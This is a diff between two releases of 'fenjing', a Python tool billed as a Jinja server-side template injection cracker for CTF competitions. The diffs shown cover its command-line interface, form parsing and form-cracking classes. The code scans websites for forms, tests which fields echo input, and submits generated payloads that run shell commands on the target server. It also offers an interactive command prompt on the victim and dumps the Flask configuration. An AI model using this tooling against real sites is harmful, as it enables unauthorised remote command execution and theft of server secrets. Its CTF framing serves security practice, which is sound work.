# Comparing `tmp/fenjing-0.4.2.tar.gz` & `tmp/fenjing-0.4.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "fenjing-0.4.2.tar", last modified: Fri Jul  7 15:52:34 2023, max compression
+gzip compressed data, was "fenjing-0.4.3.tar", last modified: Sat Jul  8 11:58:23 2023, max compression
```

## Comparing `fenjing-0.4.2.tar` & `fenjing-0.4.3.tar`

### file list

```diff
@@ -1,37 +1,37 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-07 15:52:34.933757 fenjing-0.4.2/
--rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-07-07 15:52:23.000000 fenjing-0.4.2/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)      114 2023-07-07 15:52:23.000000 fenjing-0.4.2/MANIFEST.in
--rw-r--r--   0 runner    (1001) docker     (123)     6557 2023-07-07 15:52:34.933757 fenjing-0.4.2/PKG-INFO
--rwxr-xr-x   0 runner    (1001) docker     (123)     6120 2023-07-07 15:52:23.000000 fenjing-0.4.2/README.md
--rw-r--r--   0 runner    (1001) docker     (123)        6 2023-07-07 15:52:23.000000 fenjing-0.4.2/VERSION
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-07 15:52:34.929757 fenjing-0.4.2/fenjing/
--rwxr-xr-x   0 runner    (1001) docker     (123)      199 2023-07-07 15:52:23.000000 fenjing-0.4.2/fenjing/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)       60 2023-07-07 15:52:23.000000 fenjing-0.4.2/fenjing/__main__.py
--rw-r--r--   0 runner    (1001) docker     (123)     8080 2023-07-07 15:52:23.000000 fenjing-0.4.2/fenjing/cli.py
--rw-r--r--   0 runner    (1001) docker     (123)      800 2023-07-07 15:52:23.000000 fenjing-0.4.2/fenjing/colorize.py
--rw-r--r--   0 runner    (1001) docker     (123)      838 2023-07-07 15:52:23.000000 fenjing-0.4.2/fenjing/config_payload.py
--rw-r--r--   0 runner    (1001) docker     (123)     1624 2023-07-07 15:52:23.000000 fenjing-0.4.2/fenjing/const.py
--rw-r--r--   0 runner    (1001) docker     (123)     2305 2023-07-07 15:52:23.000000 fenjing-0.4.2/fenjing/context_vars.py
--rw-r--r--   0 runner    (1001) docker     (123)     2670 2023-07-07 15:52:23.000000 fenjing-0.4.2/fenjing/form.py
--rw-r--r--   0 runner    (1001) docker     (123)     5823 2023-07-07 15:52:23.000000 fenjing-0.4.2/fenjing/form_cracker.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     6682 2023-07-07 15:52:23.000000 fenjing-0.4.2/fenjing/full_payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)    31730 2023-07-07 15:52:23.000000 fenjing-0.4.2/fenjing/payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     1640 2023-07-07 15:52:23.000000 fenjing-0.4.2/fenjing/requester.py
--rw-r--r--   0 runner    (1001) docker     (123)     1180 2023-07-07 15:52:23.000000 fenjing-0.4.2/fenjing/scan_url.py
--rw-r--r--   0 runner    (1001) docker     (123)      941 2023-07-07 15:52:23.000000 fenjing-0.4.2/fenjing/shell_payload.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-07 15:52:34.929757 fenjing-0.4.2/fenjing/templates/
--rw-r--r--   0 runner    (1001) docker     (123)     7489 2023-07-07 15:52:23.000000 fenjing-0.4.2/fenjing/templates/index.html
--rw-r--r--   0 runner    (1001) docker     (123)     3733 2023-07-07 15:52:23.000000 fenjing-0.4.2/fenjing/waf_func_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     9117 2023-07-07 15:52:23.000000 fenjing-0.4.2/fenjing/webui.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-07 15:52:34.929757 fenjing-0.4.2/fenjing.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)     6557 2023-07-07 15:52:34.000000 fenjing-0.4.2/fenjing.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      643 2023-07-07 15:52:34.000000 fenjing-0.4.2/fenjing.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-07 15:52:34.000000 fenjing-0.4.2/fenjing.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       43 2023-07-07 15:52:34.000000 fenjing-0.4.2/fenjing.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-07 15:52:34.000000 fenjing-0.4.2/fenjing.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       43 2023-07-07 15:52:23.000000 fenjing-0.4.2/requirements.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-07 15:52:34.933757 fenjing-0.4.2/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)      944 2023-07-07 15:52:23.000000 fenjing-0.4.2/setup.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-07 15:52:34.933757 fenjing-0.4.2/tests/
--rw-r--r--   0 runner    (1001) docker     (123)     5343 2023-07-07 15:52:23.000000 fenjing-0.4.2/tests/test_full_payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     3475 2023-07-07 15:52:23.000000 fenjing-0.4.2/tests/test_payload_gen.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 11:58:23.172106 fenjing-0.4.3/
+-rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-07-08 11:58:13.000000 fenjing-0.4.3/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)      114 2023-07-08 11:58:13.000000 fenjing-0.4.3/MANIFEST.in
+-rw-r--r--   0 runner    (1001) docker     (123)     6557 2023-07-08 11:58:23.172106 fenjing-0.4.3/PKG-INFO
+-rwxr-xr-x   0 runner    (1001) docker     (123)     6120 2023-07-08 11:58:13.000000 fenjing-0.4.3/README.md
+-rw-r--r--   0 runner    (1001) docker     (123)        6 2023-07-08 11:58:13.000000 fenjing-0.4.3/VERSION
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 11:58:23.168106 fenjing-0.4.3/fenjing/
+-rwxr-xr-x   0 runner    (1001) docker     (123)      203 2023-07-08 11:58:13.000000 fenjing-0.4.3/fenjing/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)       61 2023-07-08 11:58:13.000000 fenjing-0.4.3/fenjing/__main__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     8524 2023-07-08 11:58:13.000000 fenjing-0.4.3/fenjing/cli.py
+-rw-r--r--   0 runner    (1001) docker     (123)      874 2023-07-08 11:58:13.000000 fenjing-0.4.3/fenjing/colorize.py
+-rw-r--r--   0 runner    (1001) docker     (123)      919 2023-07-08 11:58:13.000000 fenjing-0.4.3/fenjing/config_payload.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1850 2023-07-08 11:58:13.000000 fenjing-0.4.3/fenjing/const.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3295 2023-07-08 11:58:13.000000 fenjing-0.4.3/fenjing/context_vars.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3029 2023-07-08 11:58:13.000000 fenjing-0.4.3/fenjing/form.py
+-rw-r--r--   0 runner    (1001) docker     (123)     6583 2023-07-08 11:58:13.000000 fenjing-0.4.3/fenjing/form_cracker.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     7292 2023-07-08 11:58:13.000000 fenjing-0.4.3/fenjing/full_payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)    31678 2023-07-08 11:58:13.000000 fenjing-0.4.3/fenjing/payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2060 2023-07-08 11:58:13.000000 fenjing-0.4.3/fenjing/requester.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1792 2023-07-08 11:58:13.000000 fenjing-0.4.3/fenjing/scan_url.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1038 2023-07-08 11:58:13.000000 fenjing-0.4.3/fenjing/shell_payload.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 11:58:23.172106 fenjing-0.4.3/fenjing/templates/
+-rw-r--r--   0 runner    (1001) docker     (123)     7489 2023-07-08 11:58:13.000000 fenjing-0.4.3/fenjing/templates/index.html
+-rw-r--r--   0 runner    (1001) docker     (123)     5074 2023-07-08 11:58:13.000000 fenjing-0.4.3/fenjing/waf_func_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     9354 2023-07-08 11:58:13.000000 fenjing-0.4.3/fenjing/webui.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 11:58:23.168106 fenjing-0.4.3/fenjing.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     6557 2023-07-08 11:58:23.000000 fenjing-0.4.3/fenjing.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      643 2023-07-08 11:58:23.000000 fenjing-0.4.3/fenjing.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-08 11:58:23.000000 fenjing-0.4.3/fenjing.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       48 2023-07-08 11:58:23.000000 fenjing-0.4.3/fenjing.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-08 11:58:23.000000 fenjing-0.4.3/fenjing.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       48 2023-07-08 11:58:13.000000 fenjing-0.4.3/requirements.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-08 11:58:23.172106 fenjing-0.4.3/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)      944 2023-07-08 11:58:13.000000 fenjing-0.4.3/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 11:58:23.172106 fenjing-0.4.3/tests/
+-rw-r--r--   0 runner    (1001) docker     (123)     7156 2023-07-08 11:58:13.000000 fenjing-0.4.3/tests/test_full_payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3784 2023-07-08 11:58:13.000000 fenjing-0.4.3/tests/test_payload_gen.py
```

### Comparing `fenjing-0.4.2/LICENSE` & `fenjing-0.4.3/LICENSE`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.2/PKG-INFO` & `fenjing-0.4.3/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.4.2
+Version: 0.4.3
 Summary: A Jinja SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.7
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
```

### Comparing `fenjing-0.4.2/README.md` & `fenjing-0.4.3/README.md`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.2/fenjing/cli.py` & `fenjing-0.4.3/fenjing/cli.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,240 +1,291 @@
+"""命令行界面的入口
+
+"""
+
 import logging
 from urllib.parse import urlparse
-from traceback import print_exc
 from typing import Callable, List, Dict
 from functools import partial
 
-from .form import Form
+import click
+
+
+from .form import get_form
 from .form_cracker import FormCracker
 from .full_payload_gen import FullPayloadGen
 from .scan_url import yield_form
 from .requester import Requester
-from .const import *
+from .const import (
+    OS_POPEN_READ,
+    DEFAULT_USER_AGENT,
+    CONFIG,
+)
 from .colorize import colored
 from .webui import main as webui_main
-import click
 
-TITLE = colored("yellow", r"""
-    ____             _ _            
+TITLE = colored(
+    "yellow",
+    r"""
+    ____             _ _
    / __/__  ____    (_|_)___  ____ _
   / /_/ _ \/ __ \  / / / __ \/ __ `/
- / __/  __/ / / / / / / / / / /_/ / 
-/_/  \___/_/ /_/_/ /_/_/ /_/\__, /  
-              /___/        /____/   
-""".strip("\n"), bold=True)
+ / __/  __/ / / / / / / / / / /_/ /
+/_/  \___/_/ /_/_/ /_/_/ /_/\__, /
+              /___/        /____/
+""".strip(
+        "\n"
+    ),
+    bold=True,
+)
 LOGGING_FORMAT = "%(levelname)s:[%(name)s] | %(message)s"
 
-logging.basicConfig(
-    level=logging.INFO,
-    format=LOGGING_FORMAT
-)
+logging.basicConfig(level=logging.INFO, format=LOGGING_FORMAT)
 logger = logging.getLogger("cli")
 
 
-def cmd_exec(cmd, cracker: FormCracker, field: str, full_payload_gen: FullPayloadGen):
+def cmd_exec(
+    cmd: str,
+    cracker: FormCracker,
+    field: str,
+    full_payload_gen: FullPayloadGen,
+):
+    """在目标上执行命令并返回回显
+
+    Args:
+        cmd (str): 命令
+        cracker (FormCracker): 目标表格对应的FormCracker
+        field (str): 提交到的目标项
+        full_payload_gen (FullPayloadGen): payload生成器
+
+    Returns:
+        str: 回显
+    """
     payload, will_print = full_payload_gen.generate(OS_POPEN_READ, cmd)
-    logger.info(f"Submit payload {colored('blue', payload)}")
+    logger.info("Submit payload %s", colored("blue", payload))
     if not will_print:
-        logger.warning("Payload generator says that this payload {wont_print} command execution result.".format(
-            wont_print = colored('red', "won't print")
-        ))
-    r = cracker.submit(
-        {field: payload})
-    assert r is not None
-    return r.text
+        payload_wont_print = (
+            "Payload generator says that this "
+            + "payload %s command execution result."
+        )
+        logger.warning(payload_wont_print, colored("red", "won't print"))
+    resp = cracker.submit({field: payload})
+    assert resp is not None
+    return resp.text
 
 
-def interact(cmd_exec: Callable):
+def interact(cmd_exec_func: Callable):
     """根据提供的payload生成方法向用户提供一个交互终端
 
     Args:
-        cmd_exec (Callable): 根据输入的shell命令生成对应的payload
+        cmd_exec_func (Callable): 根据输入的shell命令生成对应的payload
     """
-    logger.info(f"Use {colored('cran', 'Ctrl+D', bold=True)} to exit.")
+    logger.info("Use %s to exit.", colored("cran", "Ctrl+D", bold=True))
     while True:
         try:
             cmd = input("$>> ")
         except EOFError:
             break
         except KeyboardInterrupt:
             break
-        try:
-            result = cmd_exec(cmd)
-            print(result)
-        except Exception:
-            print_exc()
+        result = cmd_exec_func(cmd)
+        print(result)
 
 
-def parse_headers_cookies(headers_list: List[str], cookies: str) -> Dict[str, str]:
+def parse_headers_cookies(
+    headers_list: List[str], cookies: str
+) -> Dict[str, str]:
     headers = {}
     if headers_list:
         for header in headers_list:
             k, _, v = header.partition(": ")
             if not k or not v:
                 logger.warning(f"Failed parsing {repr(header)}, ignored.")
                 continue
             if k.capitalize() != k:
                 logger.warning(f"Header {k} is not capitalized, fixed.")
                 k = k.capitalize()
             headers[k] = v
     if cookies:
         headers["Cookie"] = cookies
     return headers
-    
+
 
 @click.group()
 def main():
-    pass
+    """click的命令组"""
 
 
 @main.command()
 @click.option("--url", "-u", help="form所在的URL")
 @click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
 @click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
 @click.option("--inputs", "-i", help="form的参数，以逗号分隔")
 @click.option("--interval", default=0.0, help="每次请求的间隔")
-@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
+@click.option(
+    "--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent"
+)
 @click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
 @click.option("--cookies", default="", help="请求时使用的Cookie")
 def get_config(
-        url: str,
-        action: str,
-        method: str,
-        inputs: str,
-        interval: float,
-        user_agent: str,
-        header: tuple,
-        cookies: str):
+    url: str,
+    action: str,
+    method: str,
+    inputs: str,
+    interval: float,
+    user_agent: str,
+    header: tuple,
+    cookies: str,
+):
     """
     攻击指定的表单，并获得目标服务器的flask config
     """
     print(TITLE)
-    assert all(param is not None for param in [
-               url, inputs]), "Please check your param"
-    form = Form(
+    assert all(
+        param is not None for param in [url, inputs]
+    ), "Please check your param"
+    form = get_form(
         action=action or urlparse(url).path,
         method=method,
-        inputs=inputs.split(",")
+        inputs=inputs.split(","),
     )
     requester = Requester(
         interval=interval,
         user_agent=user_agent,
-        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies)
-    )
-    cracker = FormCracker(
-        url=url,
-        form=form,
-        requester=requester
+        headers=parse_headers_cookies(
+            headers_list=list(header), cookies=cookies
+        ),
     )
+    cracker = FormCracker(url=url, form=form, requester=requester)
     result = cracker.crack()
     if result is None:
         logger.warning("Test form failed...")
         return
     full_payload_gen, field = result
     payload = full_payload_gen.generate(CONFIG)
-    r = cracker.submit(
-        {field: payload})
-    
-    print(r.text if r is not None else None)
+    resp = cracker.submit({field: payload})
+
+    print(resp.text if resp is not None else None)
     logger.warning("Bye!")
 
+
 @main.command()
 @click.option("--url", "-u", help="form所在的URL")
 @click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
 @click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
 @click.option("--inputs", "-i", help="form的参数，以逗号分隔")
-@click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式")
+@click.option(
+    "--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式"
+)
 @click.option("--interval", default=0.0, help="每次请求的间隔")
-@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
+@click.option(
+    "--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent"
+)
 @click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
 @click.option("--cookies", default="", help="请求时使用的Cookie")
 def crack(
-        url: str,
-        action: str,
-        method: str,
-        inputs: str,
-        exec_cmd: str,
-        interval: float,
-        user_agent: str,
-        header: tuple,
-        cookies: str):
+    url: str,
+    action: str,
+    method: str,
+    inputs: str,
+    exec_cmd: str,
+    interval: float,
+    user_agent: str,
+    header: tuple,
+    cookies: str,
+):
     """
     攻击指定的表单
     """
     print(TITLE)
-    assert all(param is not None for param in [
-               url, inputs]), "Please check your param"
-    form = Form(
+    assert all(
+        param is not None for param in [url, inputs]
+    ), "Please check your param"
+    form = get_form(
         action=action or urlparse(url).path,
         method=method,
-        inputs=inputs.split(",")
+        inputs=inputs.split(","),
     )
     requester = Requester(
         interval=interval,
         user_agent=user_agent,
-        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies)
-    )
-    cracker = FormCracker(
-        url=url,
-        form=form,
-        requester=requester
+        headers=parse_headers_cookies(
+            headers_list=list(header), cookies=cookies
+        ),
     )
+    cracker = FormCracker(url=url, form=form, requester=requester)
     result = cracker.crack()
     if result is None:
         logger.warning("Test form failed...")
         return
     full_payload_gen, field = result
-    cmd_exec_func = partial(cmd_exec, cracker=cracker,
-                            field=field, full_payload_gen=full_payload_gen)
+    cmd_exec_func = partial(
+        cmd_exec,
+        cracker=cracker,
+        field=field,
+        full_payload_gen=full_payload_gen,
+    )
     if exec_cmd == "":
         interact(cmd_exec_func)
     else:
         print(cmd_exec_func(exec_cmd))
     logger.warning("Bye!")
 
 
 @main.command()
 @click.option("--url", "-u", help="需要扫描的URL")
 @click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则进入交互模式")
 @click.option("--interval", default=0.0, help="每次请求的间隔")
-@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
+@click.option(
+    "--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent"
+)
 @click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
 @click.option("--cookies", default="", help="请求时使用的Cookie")
 def scan(url, exec_cmd, interval, user_agent, header, cookies):
     """
     扫描指定的网站
     """
     print(TITLE)
     requester = Requester(
-        interval=interval, 
-        user_agent=user_agent, 
-        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies)
+        interval=interval,
+        user_agent=user_agent,
+        headers=parse_headers_cookies(
+            headers_list=list(header), cookies=cookies
+        ),
     )
     for page_url, forms in yield_form(requester, url):
         for form in forms:
-            cracker = FormCracker(url=page_url, form=form, requester=requester)
+            cracker = FormCracker(
+                url=page_url, form=form, requester=requester
+            )
             result = cracker.crack()
             if result is None:
                 continue
             full_payload_gen, field = result
-            cmd_exec_func = partial(cmd_exec, cracker=cracker,
-                                    field=field, full_payload_gen=full_payload_gen)
+            cmd_exec_func = partial(
+                cmd_exec,
+                cracker=cracker,
+                field=field,
+                full_payload_gen=full_payload_gen,
+            )
             if exec_cmd == "":
                 interact(cmd_exec_func)
             else:
                 print(cmd_exec_func(exec_cmd))
             return
     logger.warning("Scan failed...")
 
 
 @main.command()
-@click.option("--host", "-h", default = "127.0.0.1", help="需要监听的host, 默认为127.0.0.1")
-@click.option("--port", "-p", default = 11451, help="需要监听的端口, 默认为11451")
+@click.option(
+    "--host", "-h", default="127.0.0.1", help="需要监听的host, 默认为127.0.0.1"
+)
+@click.option("--port", "-p", default=11451, help="需要监听的端口, 默认为11451")
 def webui(host, port):
     """
     启动webui
     """
     webui_main(host, port)
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     main()
```

### Comparing `fenjing-0.4.2/fenjing/colorize.py` & `fenjing-0.4.3/fenjing/colorize.py`

 * *Files 20% similar despite different names*

```diff
@@ -1,7 +1,11 @@
+"""给字符串加上ANSI转义符以在命令行中打印出颜色
+
+"""
+
 import platform
 
 SHOULD_COLOR = platform.system() != "Windows"
 
 
 def colored(color, text, bold=False):
     """使用ANSI转义字符对文本上色，在windows下不会上色
```

### Comparing `fenjing-0.4.2/fenjing/config_payload.py` & `fenjing-0.4.3/fenjing/config_payload.py`

 * *Files 18% similar despite different names*

```diff
@@ -1,14 +1,26 @@
-from typing import Callable, Tuple, Dict, Union
+"""生成获取config的payload
+
+"""
+
+from typing import Callable, Dict, Union
 from .const import CONFIG
 from .full_payload_gen import FullPayloadGen
 
 full_payload_store: Dict[int, FullPayloadGen] = {}
 
-def config_payload(waf_func: Callable[[str, ], bool]) -> Union[str, None]:
+
+def config_payload(
+    waf_func: Callable[
+        [
+            str,
+        ],
+        bool,
+    ]
+) -> Union[str, None]:
     """根据提供的waf函数生成读取config的payload
 
     Args:
         waf_func (Callable[[str, ], bool]): waf函数，判断提供的payload能否通过waf, 能则返回True
 
     Returns:
         str|None: payload
@@ -19,8 +31,7 @@
         full_payload_store[id(waf_func)] = full_payload
     else:
         full_payload = full_payload_store[id(waf_func)]
     payload, will_print = full_payload.generate(CONFIG)
     if not will_print:
         return None
     return payload
-
```

### Comparing `fenjing-0.4.2/fenjing/form.py` & `fenjing-0.4.3/fenjing/form.py`

 * *Files 13% similar despite different names*

```diff
@@ -1,100 +1,115 @@
+"""与HTML表格相关的函数
+
+"""
+import sys
 from urllib.parse import urlparse, urlunparse
-from typing import Iterable
 import random
 import logging
 import string
-from typing import Dict, Any, List, Union
+from typing import Dict, List, Union, Iterable
 
 from bs4 import BeautifulSoup
 
 logger = logging.getLogger("utils.form")
+Form = Dict[
+    str,
+    Union[str, set],
+]
+if sys.version_info >= (3, 8):
+    from typing import Literal
+
+    Form = Dict[
+        Literal["action", "inputs", "method"],
+        Union[str, set],
+    ]
 
 
-def Form(*, action: str, inputs: Iterable, method: str = "POST") -> Dict[str, Any]:
+def get_form(action: str, inputs: Iterable, method: str = "POST") -> Form:
     """根据输入生成一个表单
 
     Args:
         action (str): action
         inputs (Iterable): 所有input
         method (str, optional): 提交方法. Defaults to "POST".
 
     Returns:
-        Dict[str, Any]: 表单
+        Form: 表单
     """
     method = method.upper()
     if not action.startswith("/"):
         action = "/" + action
     assert method in ["GET", "POST"]
-    return {
-        "action": action,
-        "method": method,
-        "inputs": set(inputs)
-    }
+    return {"action": action, "method": method, "inputs": set(inputs)}
 
 
-def parse_forms(url, html: Union[str, BeautifulSoup]) -> List[dict]:
+def parse_forms(url, html: Union[str, BeautifulSoup]) -> List[Form]:
     """从html中解析出对应的表单
 
     Args:
         url (str): HTML对应的URL
         html (Union[str, BeautifulSoup]): HTML
 
     Returns:
-        List[dict]: 所有表单
+        List[Form]: 所有表单
     """
     parsed_url = urlparse(url)
     uri = parsed_url.path
 
     if isinstance(html, str):
-        bs = BeautifulSoup(html, "html.parser")
+        bs_doc = BeautifulSoup(html, "html.parser")
     elif isinstance(html, BeautifulSoup):
-        bs = html
+        bs_doc = html
 
     details = []
-    for form_element in bs.select("form"):
-        form = Form(
+    for form_element in bs_doc.select("form"):
+        form = get_form(
             action=form_element.attrs.get("action", uri),
             method=form_element.attrs.get("method", "POST").upper(),
             inputs=[
                 element.attrs["name"]
                 for element in form_element.select("input")
                 if "name" in element.attrs
-            ]
+            ],
         )
         details.append(form)
     return details
 
 
-def random_fill(form):
-    """
-    randomli fill the form
+def random_fill(form: Form) -> Dict[str, str]:
+    """随机填充表格
+
+    Args:
+        form (Form): 表格
+
+    Returns:
+        Dict[str, str]: 随机填充的结果，键为表格项，值为表格项的值
     """
     return {
         k: "".join(random.choices(string.ascii_lowercase, k=8))
         for k in form["inputs"]
     }
 
 
-def fill_form(url, form, form_inputs=None, random_fill_other=True):
+def fill_form(url, form, form_inputs=None, randomly_fill_other=True):
     """根据输入填充表单，返回给requests库的参数
 
     Args:
         url (str): 表单所在的URL
         form (dict): 表单
         form_inputs (dict, optional): input以及对应的值. Defaults to None.
-        random_fill_other (bool, optional): 是否随机填充其他input. Defaults to True.
+        randomly_fill_other (bool, optional): 是否随机填充其他input. Defaults to True.
 
     Returns:
         dict: 给requests的参数
     """
-    if random_fill_other:
+    if randomly_fill_other:
         fill = random_fill(form)
         if form_inputs is not None:
             fill.update(form_inputs)
     else:
         fill = form_inputs
     return {
         "url": urlunparse(urlparse(url)._replace(path=form["action"])),
         "method": form["method"],
-        ("data" if form["method"] == "POST" else "params"): fill
+        ("data" if form["method"] == "POST" else "params"): fill,
     }
```

### Comparing `fenjing-0.4.2/fenjing/form_cracker.py` & `fenjing-0.4.3/fenjing/form_cracker.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,170 +1,214 @@
+"""攻击指定的表单
+
+"""
+
 from collections import namedtuple
 import logging
 from typing import List, Dict, Any, Union, Callable
 
 from .form import random_fill, fill_form
 from .requester import Requester
 from .colorize import colored
-from .const import *
+from .const import (
+    CALLBACK_SUBMIT,
+    CALLBACK_TEST_FORM_INPUT,
+    OS_POPEN_READ,
+)
 from .waf_func_gen import WafFuncGen
 from .full_payload_gen import FullPayloadGen
 
 logger = logging.getLogger("form_cracker")
 Result = namedtuple("Result", "full_payload_gen input_field")
 
 
 class FormCracker:
     """对指定的文档进行攻击
     其接受一个表格及其对应的URL，还有一个用于发送请求的requester。
     其会根据一系列危险的关键字获取被WAF时页面的hash, 据此生成一个waf函数用于生成payload
     """
+
     test_cmd = "echo f3n  j1ng;"
     test_result = "f3n j1ng"
     test_vulunable_inputs_times = 5
 
     def __init__(
-            self,
-            url: str,
-            form: Dict[str, Any],
-            requester: Requester,
-            callback: Union[Callable[[str, Dict], None], None] = None
+        self,
+        url: str,
+        form: Dict[str, Any],
+        requester: Requester,
+        callback: Union[Callable[[str, Dict], None], None] = None,
     ):
         """生成用于攻击form的类
 
         Args:
             url (str, optional): form所在的url.
             form (dict): 解析后的form元素
             requester (Requester, optional): 用于发出请求的requester，为None时自动构造.
-            callback (Union[Callable[[str, Dict], None], None]): callback函数，在完成某些阶段后会调用此函数
+            callback (Union[Callable[[str, Dict], None], None]):
+                callback函数，在完成某些阶段后会调用此函数
         """
         self.url = url
         self.form = form
         self.req = requester
-        self._callback: Callable[[str, Dict], None] = callback if callback else (
-            lambda x, y: None)
-        self.waf_func_gen = WafFuncGen(self.url, self.form, self.req, self.callback)
+        self._callback: Callable[[str, Dict], None] = (
+            callback if callback else (lambda x, y: None)
+        )
+        self.waf_func_gen = WafFuncGen(
+            self.url, self.form, self.req, self.callback
+        )
 
     @property
     def callback(self):
+        """Callback函数
+
+        Returns:
+            Callable: Callback函数
+        """
         return self._callback
-    
+
     @callback.setter
     def callback(self, callback):
         self._callback = callback
 
     def vulunable_inputs(self) -> List[str]:
         """解析出form中有回显的input
 
         Returns:
             List[str]: 所有有回显的input name
         """
         answers = []
         for _ in range(self.test_vulunable_inputs_times):
             fill_dict = random_fill(self.form)
             r = self.req.request(
-                **fill_form(
-                    self.url,
-                    self.form,
-                    form_inputs=fill_dict))
+                **fill_form(self.url, self.form, form_inputs=fill_dict)
+            )
             assert r is not None
-            answers += [
-                k for k, v in fill_dict.items()
-                if v in r.text
-            ]
+            answers += [k for k, v in fill_dict.items() if v in r.text]
         return list(set(answers))
 
     def submit(self, inputs: dict):
         """根据inputs提交form
 
         Args:
             inputs (dict): 需要提交的input
 
         Returns:
             requests.Response: 返回的reponse元素
         """
         all_length = sum(len(v) for v in inputs.values())
         if all_length > 2048 and self.form["method"] == "GET":
             logger.warning(
-                f"inputs are extremely long (len={all_length}) that the request might fail")
+                "inputs are extremely long (len=%d) that "
+                + "the request might fail",
+                all_length,
+            )
+
+        resp = self.req.request(**fill_form(self.url, self.form, inputs))
+
+        self.callback(
+            CALLBACK_SUBMIT,
+            {
+                "form": self.form,
+                "inputs": inputs,
+                "response": resp,
+            },
+        )
 
-        r = self.req.request(
-            **fill_form(self.url, self.form, inputs))
+        return resp
 
-        self.callback(CALLBACK_SUBMIT, {
-            "form": self.form,
-            "inputs": inputs,
-            "response": r,
-        })
+    def test_input(self, input_field: str, payload: str) -> bool:
+        """测试对应的表单项是否有回显
 
-        return r
+        Args:
+            input_field (str): 表单项
+            payload (str): 表单项的值
 
-    def test_input(self, input_field, payload):
+        Returns:
+            bool: 是否有回显
+        """
         logger.info(
-            f"Input {colored('yellow', repr(input_field))} looks great, testing generated payload.")
-        r = self.submit({input_field: payload})
-        assert r is not None
-        return self.test_result in r.text
+            "Input %s looks great, testing generated payload.",
+            colored("yellow", repr(input_field)),
+        )
+        resp = self.submit({input_field: payload})
